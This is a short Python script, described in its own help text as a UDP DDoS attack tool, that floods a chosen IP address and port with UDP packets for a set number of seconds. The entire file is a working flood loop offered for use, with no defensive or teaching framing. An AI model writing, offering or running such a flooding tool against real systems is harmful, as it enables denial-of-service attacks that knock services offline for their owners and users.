#!/usr/bin/env python3
# -*- coding : utf-8 -*-

import argparse
import sys
import socket
import threading


def end() :
    global on
    on = False

if __name__ == '__main__' :
    parser = argparse.ArgumentParser(description="DDOS udp script 1.")

    parser.add_argument('-u', '--udp', action='store_true', required=False, help="Run UDP DDOS attack.")

    parser.add_argument('dst_ip', default="127.0.0.1", help ="Destination IP.")
    parser.add_argument('dst_port', default=4444, help="Destination port.")
    parser.add_argument('time', default=30, help="Time of the DDOS attack.")

    args = parser.parse_args()

    ip = sys.argv[2]
    port = int(sys.argv[3])
    time = int(sys.argv[4])

    if args.udp :
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        on = True
        timer = threading.Timer(time, end)
        timer.start()
        while(on):
            udp.sendto(b"This is The End Of The Game", (ip, port))
